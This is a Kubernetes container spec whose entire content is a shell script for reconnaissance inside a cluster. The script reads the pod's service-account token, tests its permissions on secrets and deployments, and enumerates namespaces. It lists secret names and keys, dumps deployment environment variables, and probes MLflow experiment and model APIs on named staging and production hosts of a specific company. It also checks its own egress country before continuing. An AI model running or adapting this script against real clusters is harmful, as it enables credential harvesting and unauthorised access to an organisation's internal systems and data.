containers.name: probe
args:
#!/bin/sh
set -u
echo "===I3577C_START utc=$(date -u +%FT%TZ)==="
apk add --no-cache postgresql16-client curl jq aws-cli openssl >/tmp/apk.log 2>&1
echo "apk=$? psql=$(command -v psql||echo none)"
GEO=$(curl -s -m 20 http://ip-api.com/json/); echo "GEO $GEO"
echo "$GEO" | grep -q '"countryCode":"CN"' && { echo "ABORT_CN_EGRESS"; exit 0; }
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token 2>/dev/null); API=https://kubernetes.default.svc
get(){ curl -sk -m 60 -H "Authorization: Bearer $TOKEN" "$1"; }
post(){ curl -sk -m 60 -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --data "$2" "$1"; }
SSAR(){ post $API/apis/authorization.k8s.io/v1/selfsubjectaccessreviews "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectAccessReview\",\"spec\":{\"resourceAttributes\":{\"verb\":\"$1\",\"resource\":\"$2\"${3:-}}}}" | jq -r '.status.allowed // "ERR"'; }
echo "SSAR list pods = $(SSAR list pods)"
echo "SSAR list secrets = $(SSAR list secrets)"
echo "SSAR get secrets = $(SSAR get secrets)"
echo "SSAR list deployments = $(SSAR list deployments ',"group":"apps"')"
echo "-- ALL NS: $(get $API/api/v1/namespaces | jq -r '[.items[].metadata.name]|join(",")' | head -c 1500)"

echo "########## MLFLOW DISCOVERY ##########"
echo "-- NS mlflow:"
get $API/api/v1/namespaces/mlflow | jq -r '.metadata.name // .message' | head -3
echo "-- PODS in mlflow:"
get $API/api/v1/namespaces/mlflow/pods | jq -r '.items[]? | "POD \(.metadata.name) st=\(.status.phase) img=\(.spec.containers[0].image) node=\(.spec.nodeName)"' | head -20
echo "   (msg: $(get $API/api/v1/namespaces/mlflow/pods | jq -r '.message // "ok"' | head -c 120))"
echo "-- DEPLOY in mlflow:"
get $API/apis/apps/v1/namespaces/mlflow/deployments | jq -r '.items[]? | "DEP \(.metadata.name) replicas=\(.spec.replicas) img=\(.spec.template.spec.containers[0].image)"' | head -10
echo "-- STATEULSET in mlflow:"
get $API/apis/apps/v1/namespaces/mlflow/statefulsets | jq -r '.items[]? | "STS \(.metadata.name)"' | head
echo "-- SVC in mlflow:"
get $API/api/v1/namespaces/mlflow/services | jq -r '.items[]? | "SVC \(.metadata.name) \(.spec.clusterIP) \(.spec.ports[0].port)"' | head
echo "-- CM in mlflow (names + env-ish keys):"
get $API/api/v1/namespaces/mlflow/configmaps | jq -r '.items[]? | "CM \(.metadata.name) keys=\((.data//{})|keys|join(","))"' | head -20
echo "-- SECRETS in mlflow (names only):"
get $API/api/v1/namespaces/mlflow/secrets | jq -r '.items[]? | "SEC \(.metadata.name) type=\(.type) keys=\((.data//{})|keys|join(","))"' | head -20
echo "-- DEPLOY ENV dump (mlflow only):"
get $API/apis/apps/v1/namespaces/mlflow/deployments | jq -r '.items[]? | .metadata.name as $n | .spec.template.spec.containers[]? | "ENV[\($n)/\(.name)] " + ((.env//[])|map("\(.name)=\(.value // "REF")")|join(" "))' | head -20
echo "-- OTHER NS with mlflow-ish deploy:"
for NS in $(get $API/api/v1/namespaces | jq -r '.items[].metadata.name'); do
  D=$(get "$API/apis/apps/v1/namespaces/$NS/deployments" 2>/dev/null | jq -r --arg ns "$NS" '.items[]? | select((.metadata.name|test("mlflow";"i"))) | "DEP \($ns)/\(.metadata.name)"' 2>/dev/null)
  [ -n "$D" ] && echo "$D"
done
echo "-- MLFLOW HTTP (in-cluster DNS)"
for H in mlflow.stage01.lazamedical.ai mlflow.prod01.lazamedical.ai; do
  IP=$(getent hosts $H | awk '{print $1}' | head -1); echo "DNS $H -> ${IP:-NXDOMAIN}"
  [ -z "$IP" ] && continue
  C1=$(curl -s -m 20 -o /dev/null -w "%{http_code}" "https://$H/health"); echo "GET https://$H/health => $C1"
  B1=$(curl -sk -m 25 "https://$H/api/2.0/mlflow/experiments/list?max_results=3" | head -c 400); echo "EXP_LIST => $B1"
  B2=$(curl -sk -m 25 "https://$H/api/2.0/mlflow/registered-models/list" | head -c 400); echo "RM_LIST => $B2"
done
echo "===I3577C_DONE $(date -u +%FT%TZ)==="
